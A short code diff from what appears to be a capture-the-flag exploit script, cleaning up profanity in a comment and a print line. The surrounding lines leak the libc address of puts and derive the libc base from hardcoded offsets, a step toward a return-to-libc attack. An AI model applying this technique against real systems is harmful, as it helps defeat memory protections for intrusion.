@@ -55,8 +55,8 @@ puts_libc = leak_libc_address('puts')
 print(puts_libc, '\n')
 puts_libc_baseoffset = 0x05f890
 
-# setvbuf from server won't fucking work, so from that libc it might be
-print("Shits busted yo")
+# setvbuf from server won't work, so from that libc it might be
+print("setvbuf from server doesn't work")
 base_address = int(puts_libc, 16) - puts_libc_baseoffset
 print(f"Derived base address from puts: {hex(base_address)}")
 setvbuf_libc_baseoffset = 0x060000  # manually taken from libc
